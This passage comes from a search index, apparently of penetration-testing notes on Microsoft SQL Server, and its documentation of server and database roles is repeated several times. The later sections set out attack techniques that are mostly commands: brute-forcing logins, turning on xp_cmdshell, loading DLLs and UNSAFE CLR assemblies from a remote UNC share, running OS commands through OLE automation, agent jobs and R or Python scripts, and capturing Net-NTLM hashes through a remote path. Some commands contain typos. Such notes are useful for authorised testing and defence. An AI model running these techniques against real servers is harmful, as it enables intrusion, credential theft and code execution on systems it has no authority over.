activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners.) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator Can back up the database. db_ddladmin Can run any Data Definition Language (DDL) command. db_datawriter Can add, delete, or change data in all user tables. db_datareader Can read all data from all user tables. db_denydatawriter Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader Cannot read any data in the user tables within a database. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017 Special Roles for SQL Database and SQL Data Warehouse Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. Role Description dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager Can create and delete logins in the virtual master database. msdb Roles Role Description db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin may be able to elevate their privileges to sysadmin. [1] dc_admin dc_operator dc_proxy Can administer and use the data collector. PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. dc_admin may be able to elevate their privileges to sysadmin. [1] ServerGroupAdministratorRole ServerGroupReaderRole Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor. Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles R Services Role Description rpkgs-users Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs-private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs-shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages. Working with Database-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles Application Roles Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole","title":"01. Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#01-roles-and-permissions","text":"","title":"01. Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#principals","text":"Principals are entities that can request SQL Server resources.","title":"Principals"},{"location":"databases/sqlserver/0-roles-and-permissions/#sql-server-level-principals","text":"SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role","title":"SQL Server-level principals"},{"location":"databases/sqlserver/0-roles-and-permissions/#database-level-principals","text":"Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST; ) Database Role Application Role","title":"Database-level principals"},{"location":"databases/sqlserver/0-roles-and-permissions/#special-schemas","text":"INFORMATION_SCHEMA sys","title":"Special Schemas"},{"location":"databases/sqlserver/0-roles-and-permissions/#server-level-roles-and-permissions","text":"","title":"Server-Level Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#fixed-roles","text":"Role Description sysadmin Can perform any activity in the server. serveradmin Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin Can end processes that are running in an instance of SQL Server. setupadmin Can add and remove linked servers by using Transact-SQL statements. (sysadmin membership is needed when using Management Studio.) bulkadmin Can run the BULK INSERT statement. diskadmin Used for managing disk files. dbcreator Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles.","title":"Fixed Roles"},{"location":"databases/sqlserver/0-roles-and-permissions/#fixed-roles-and-permissions","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017","title":"Fixed Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#working-with-server-level-roles","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles","title":"Working with Server-Level Roles"},{"location":"databases/sqlserver/0-roles-and-permissions/#database-level-roles-and-permissions","text":"CREATE LOGIN ... WITH PASSWORD = ...;","title":"Database Level Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#fixed-roles_1","text":"Role Description db_owner Can perform all configuration and maintenance activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners.) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator Can back up the database. db_ddladmin Can run any Data Definition Language (DDL) command. db_datawriter Can add, delete, or change data in all user tables. db_datareader Can read all data from all user tables. db_denydatawriter Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader Cannot read any data in the user tables within a database.","title":"Fixed Roles"},{"location":"databases/sqlserver/0-roles-and-permissions/#fixed-roles-and-permissions_1","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017","title":"Fixed Roles and Permissions"},{"location":"databases/sqlserver/0-roles-and-permissions/#special-roles-for-sql-database-and-sql-data-warehouse","text":"Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. Role Description dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager Can create and delete logins in the virtual master database.","title":"Special Roles for SQL Database and SQL Data Warehouse"},{"location":"databases/sqlserver/0-roles-and-permissions/#msdb-roles","text":"Role Description db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin may be able to elevate their privileges to sysadmin. [1] dc_admin dc_operator dc_proxy Can administer and use the data collector. PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. dc_admin may be able to elevate their privileges to sysadmin. [1] ServerGroupAdministratorRole ServerGroupReaderRole Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor. Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles","title":"msdb Roles"},{"location":"databases/sqlserver/0-roles-and-permissions/#r-services","text":"Role Description rpkgs-users Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs-private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs-shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages.","title":"R Services"},{"location":"databases/sqlserver/0-roles-and-permissions/#working-with-database-level-roles","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles","title":"Working with Database-Level Roles"},{"location":"databases/sqlserver/0-roles-and-permissions/#application-roles","text":"Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole","title":"Application Roles"},{"location":"databases/sqlserver/1-enumeration/","text":"01. Enumeration Direct Access SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient) Modules PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Discovery PowerUpSQL: Get-SQLInstanceScanUDP -ComputerName 192.168.1.2 -verbose .NET (UDP Broadcast): [System.Data.Sql.SqlDataSourceEnumeration]::Instance.GetDataSources() Local Enumeration Import-Module -Name SQLPS Get-ChildItem SQLSERVER:\\SQL\\ machinename Get-Service -Name MSSQL* sqlinstances = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server' foreach ($SQLInstance in $SQLInstances) { foreach ($s in $SQLInstance.InstalledInstances) { [PSCustomObject]@{ PSComputerName = $SQLInstance.PSComputerName InstanceName = $s}}} Get-SQLInstanceLocal http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/ Domain Enumeration Search AD user attribute: servicePrincipalName=MSSQL* Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose Queries Information Obtained Query Version SELECT @@version Current User SELECT SUSER_SNAME() SELECT SYSTEM_USER Current Role SELECT IS_SRVROLEMEMBER('sysadmin') SELECT user Current Database SELECT db_name() List All Databases SELECT name FROM master..sysdatabases List All Logins SELECT - FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE' List All Users for Database SELECT - FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE' List All Sysadmins SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 List All Roles SELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DP1 ON DRM.role_principal_id = DP1.principal_id LEFT OUTER JOIN sys.database_principals AS DP2 ON DRM.member_principal_id = DP2.principal_id WHERE DP1.type = 'R' ORDER BY DP1.name; Effective Permissions for Server SELECT - FROM fn_my_permissions(NULL, 'SERVER'); Effective Permissions for Database SELECT - FROM fn_my_permissions(NULL, 'DATABASE'); Active User Tokens SELECT - FROM sys.user_token Active Login Tokens SELECT - FROM sys.login_token Impersonatable Accounts SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' Find Trustworthy Databases SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql Information Gathering Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object {$_.is_encrypted -eq \u201cTrue } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose","title":"01. Enumeration"},{"location":"databases/sqlserver/1-enumeration/#01-enumeration","text":"","title":"01. Enumeration"},{"location":"databases/sqlserver/1-enumeration/#direct-access","text":"SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient)","title":"Direct Access"},{"location":"databases/sqlserver/1-enumeration/#modules","text":"PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL","title":"Modules"},{"location":"databases/sqlserver/1-enumeration/#discovery","text":"PowerUpSQL: Get-SQLInstanceScanUDP -ComputerName 192.168.1.2 -verbose .NET (UDP Broadcast): [System.Data.Sql.SqlDataSourceEnumeration]::Instance.GetDataSources()","title":"Discovery"},{"location":"databases/sqlserver/1-enumeration/#local-enumeration","text":"Import-Module -Name SQLPS Get-ChildItem SQLSERVER:\\SQL\\ machinename Get-Service -Name MSSQL* sqlinstances = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server' foreach ($SQLInstance in $SQLInstances) { foreach ($s in $SQLInstance.InstalledInstances) { [PSCustomObject]@{ PSComputerName = $SQLInstance.PSComputerName InstanceName = $s}}} Get-SQLInstanceLocal http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/","title":"Local Enumeration"},{"location":"databases/sqlserver/1-enumeration/#domain-enumeration","text":"Search AD user attribute: servicePrincipalName=MSSQL* Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose","title":"Domain Enumeration"},{"location":"databases/sqlserver/1-enumeration/#queries","text":"Information Obtained Query Version SELECT @@version Current User SELECT SUSER_SNAME() SELECT SYSTEM_USER Current Role SELECT IS_SRVROLEMEMBER('sysadmin') SELECT user Current Database SELECT db_name() List All Databases SELECT name FROM master..sysdatabases List All Logins SELECT - FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE' List All Users for Database SELECT - FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE' List All Sysadmins SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 List All Roles SELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DP1 ON DRM.role_principal_id = DP1.principal_id LEFT OUTER JOIN sys.database_principals AS DP2 ON DRM.member_principal_id = DP2.principal_id WHERE DP1.type = 'R' ORDER BY DP1.name; Effective Permissions for Server SELECT - FROM fn_my_permissions(NULL, 'SERVER'); Effective Permissions for Database SELECT - FROM fn_my_permissions(NULL, 'DATABASE'); Active User Tokens SELECT - FROM sys.user_token Active Login Tokens SELECT - FROM sys.login_token Impersonatable Accounts SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' Find Trustworthy Databases SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql","title":"Queries"},{"location":"databases/sqlserver/1-enumeration/#information-gathering","text":"Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object {$_.is_encrypted -eq \u201cTrue } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose","title":"Information Gathering"},{"location":"databases/sqlserver/2-exploitation/","text":"03. Exploitation Brute-forcing Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas /noprofile /netonly /user: domain\\username powershell.exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013Verbose This is equivalent to: SELECT SUER_NAME(1) SELECT SUER_NAME(2) SELECT SUER_NAME(3) BruteForce: Get-SQLInstanceDomain | G)et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $(Get-SQLInstanceDomain).ComputerName comps | Invoke-BruteForce -UserList C:\\dict\\users.txt -PasswordList C:\\dict\\passwords.txt -Service SQL \u2013Verbose","title":"03. Exploitation"},{"location":"databases/sqlserver/2-exploitation/#03-exploitation","text":"","title":"03. Exploitation"},{"location":"databases/sqlserver/2-exploitation/#brute-forcing","text":"Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas /noprofile /netonly /user: domain\\username powershell.exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013Verbose This is equivalent to: SELECT SUER_NAME(1) SELECT SUER_NAME(2) SELECT SUER_NAME(3) BruteForce: Get-SQLInstanceDomain | G)et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $(Get-SQLInstanceDomain).ComputerName comps | Invoke-BruteForce -UserList C:\\dict\\users.txt -PasswordList C:\\dict\\passwords.txt -Service SQL \u2013Verbose","title":"Brute-forcing"},{"location":"databases/sqlserver/3-command-execution/","text":"04. Command Execution xp_cmdshell Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc 'xp_cmdshell','xplog70.dll' If disabled: EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE Exploitation: EXEC master..xp_cmdshell 'whoami' Nishang: Execute-Command-MSSQL -ComputerName instance -UserName sa -Password pw PowerUpSQL: Invoke-SQLOSCmd -Username sa -Password pw -Instance instance -Command whoami Custom Extended Stored Procedures DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc.dll has a function called xp_calc : sp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll' EXEC xp_calc sp_dropextendedproc 'xp_calc' Create-SQLFileXpDll -OutFile C:\\fileserver\\xp_calc.dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc 'xp_calc', '\\\\192.168.15.2\\fileserver\\xp_calc.dll' Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing: Get-SQLStoredProcedureXP -Instance instance -Verbose Custom CLR Assemblies CLR (Common Language Runtime) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, Alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Create DLL: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library C:\\Users\\labuser\\Desktop\\cmd_exec.cs Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure 'show advanced options',1 RECONFIGURE GO -- Enable clr on the server sp_configure 'clr enabled',1 RECONFIGURE GO Create DLL: Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C:\\Users\\labuser\\Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM '\\\\192.168.15.2\\fileserver\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE; GO Import the assembly from string: CREATE ASSEMBLY [NMfsa] AUTHORIZATION [dbo] FROM 0x4D5A90...... Link the assembly to a stored procedure CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execution: cmd_exec 'whoami' Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose OLE Automation Procedure Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure 'show advanced options', 1; GO RECONFIGURE; GO sp_configure 'Ole Automation Procedures', 1; GO RECONFIGURE; GO Execute: DECLARE @output INT DECLARE @ProgramToRun VARCHAR(255) SET @ProgramToRun = 'Run( calc.exe )' EXEC sp_oacreate 'wScript.Shell', @output out EXEC sp_oamethod @output, @ProgramToRun EXEC sp_oadestroy @output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: -- Declare variables used to reference the objects DECLARE @objLocator int,@objWmi int,@objPermiss int,@objFull int; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate 'WbemScripting.SWbemLocator',@objLocator OUTPUT; -- Use the SWbemLocator object's ConnectServer() method to connect to the -- local WMI server. The connection will be to the 'root\\cimv2' namespace EXEC sp_OAMethod @objLocator, 'ConnectServer',@objWmi OUTPUT,'.','root\\cimv2'; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for 'ftp.exe' EXEC sp_OAMethod @objWmi, 'Get',@objPermiss OUTPUT, 'Win32_LogicalFileSecuritySetting.Path=''ftp.exe'''; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @objWmi,'Get',@objFull OUTPUT,'Win32_SecurityDescriptor'; -- Set the SecurityDescriptor's ControlFlags property to -- '4' (SE_DACL_PRESENT) EXEC sp_OASetProperty @objFull,'ControlFlags',4; -- Set the file security setting object's security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @objPermiss,'SetSecurityDescriptor',NULL,@objFull; https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/ Agent Jobs (CmdExec, PowerShell, ActiveX etc.) job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent Steps xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job Listing all Jobs SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id https://serverfault.com/a/14569 Interesting subsystems (job types): PowerShell USE msdb EXEC dbo.sp_add_job @job_name = N'PSJob' EXEC sp_add_jobstep @job_name = N'PSJob', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -noexit ps', @retry_attempts = 1, @retry_interval = 5 EXEC dbo.sp_add_jobserver @job_name = N'PSJob' EXEC dbo.sp_start_job N'PSJob' -- EXEC dbo.sp_delete_job @job_name = N'PSJob' https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution CmdExec USE msdb EXEC dbo.sp_add_job @job_name = N'cmdjob' EXEC sp_add_jobstep @job_name = N'cmdjob', @step_name = N'test_cmd_name1', @subsystem = N'cmdexec', @command = N'cmd.exe /k calc', @retry_attempts = 1, @retry_interval = 5 EXEC dbo.sp_add_jobserver @job_name = N'cmdjob' EXEC dbo.sp_start_job N'cmdjob'; -- EXEC dbo.sp_delete_job @job_name = N'cmdJob' Microsoft ActiveX Script (VBScript and Jscript) SSIS (SQL Server Integrated Services) PowerUpSQL Invoke-SQLOSCmdAgentJob \u2013Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe]se External Scripting R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure 'external scripts enabled' GO EXEC sp_execute_external_script @language=N'R', @script=N'OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T))' WITH RESULT SETS (([cmd_out] text)); GO Grab Net-NTLM hashes with R: @script=N'.libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x )' Using shell instead of system: @script=N'OutputDataSet - data.frame(shell( dir ,intern=T))' https://pastebin.com/zBDnzELT Executing commands with Python: EXEC sp_execute_external_script @language =N'Python', @script=N'import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )])' WITH RESULT SETS (([cmd_out] nvarchar(max))) Reference: https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Registry Autoruns File Autoruns","title":"04. Command Execution"},{"location":"databases/sqlserver/3-command-execution/#04-command-execution","text":"","title":"04. Command Execution"},{"location":"databases/sqlserver/3-command-execution/#xp_cmdshell","text":"Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc 'xp_cmdshell','xplog70.dll' If disabled: EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE Exploitation: EXEC master..xp_cmdshell 'whoami' Nishang: Execute-Command-MSSQL -ComputerName instance -UserName sa -Password pw PowerUpSQL: Invoke-SQLOSCmd -Username sa -Password pw -Instance instance -Command whoami","title":"xp_cmdshell"},{"location":"databases/sqlserver/3-command-execution/#custom-extended-stored-procedures","text":"DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc.dll has a function called xp_calc : sp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll' EXEC xp_calc sp_dropextendedproc 'xp_calc' Create-SQLFileXpDll -OutFile C:\\fileserver\\xp_calc.dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc 'xp_calc', '\\\\192.168.15.2\\fileserver\\xp_calc.dll' Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing: Get-SQLStoredProcedureXP -Instance instance -Verbose","title":"Custom Extended Stored Procedures"},{"location":"databases/sqlserver/3-command-execution/#custom-clr-assemblies","text":"CLR (Common Language Runtime) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, Alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Create DLL: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library C:\\Users\\labuser\\Desktop\\cmd_exec.cs Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure 'show advanced options',1 RECONFIGURE GO -- Enable clr on the server sp_configure 'clr enabled',1 RECONFIGURE GO Create DLL: Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C:\\Users\\labuser\\Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM '\\\\192.168.15.2\\fileserver\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE; GO Import the assembly from string: CREATE ASSEMBLY [NMfsa] AUTHORIZATION [dbo] FROM 0x4D5A90...... Link the assembly to a stored procedure CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execution: cmd_exec 'whoami' Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose","title":"Custom CLR Assemblies"},{"location":"databases/sqlserver/3-command-execution/#ole-automation-procedure","text":"Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure 'show advanced options', 1; GO RECONFIGURE; GO sp_configure 'Ole Automation Procedures', 1; GO 